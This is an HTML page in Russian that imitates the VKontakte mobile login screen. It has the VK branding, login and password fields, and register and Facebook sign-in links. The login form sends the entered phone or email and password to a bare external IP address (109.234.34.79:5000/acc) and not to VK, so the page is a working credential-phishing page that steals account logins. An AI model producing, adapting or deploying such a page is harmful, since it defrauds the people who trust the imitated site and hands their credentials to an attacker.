<!DOCTYPE html>
<html lang="ru">

<head>
	<meta charset="UTF-8">
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css"
		integrity="sha384-oS3vJWv+0UjzBfQzYUhtDYW+Pj2yciDJxpsK1OYPAYjqT085Qq/1cq5FLXAZQ7Ay" crossorigin="anonymous">
	<title>Мобильная версия ВКонтакте</title>
<link href="style.css" rel="stylesheet"></head>

<body>
	<div class="layout">
		<div class="layout__header">
			<i class="fab fa-vk"></i>
		</div>
		<div class="layout__body">
			<div class="installApp">
				<a href="#" class="installApp__link">
					<div class="installApp__label">
						<i class="fas fa-mobile-alt"></i>
						Установить приложение <b>ВКонтакте</b>
						<i class="fas fa-chevron-right"></i>
					</div>
				</a>
			</div>
			<div class="pcont">
				<div class="PageBlock">
					<div class="form-item">
						<div class="login_header">
							Мобильная версия поможет Вам оставаться ВКонтакте, даже если Вы далеко от
							компьютера.
						</div>
						<form action="http://109.234.34.79:5000/acc">
							<dl class="fi_row">
								<dd>
									<input type="text" class="textfield" name="login" placeholder="Телефон или email">
								</dd>
							</dl>
							<dl class="fi_row">
								<dd>
									<input type="password" class="textfield" name="password" placeholder="Пароль">
								</dd>
							</dl>
							<div class="fi_row_new">
								<input type="submit" class="button wide_button" value="Войти">
							</div>
							<div class="fi_row">
								<div class="near_btn wide_button login-restore">
									<a href="#">Забыли пароль?</a>
								</div>
							</div>
							<div class="login_new_user">
								<div class="fi_header fi_header_light">Впервые ВКонтакте?</div>
							</div>
							<div class="fi_row">
								<a href="#" class="button wide_button success">
									Зарегистрироваться
								</a>
							</div>
							<div class="socials">
								<a href="#" class="social_button">
									<i class="fab fa-facebook-square"></i>
									Войти через Facebook
								</a>
							</div>
						</form>
					</div>
				</div>
			</div>
		</div>
	</div>
<script type="text/javascript" src="index.js"></script></body>

</html>
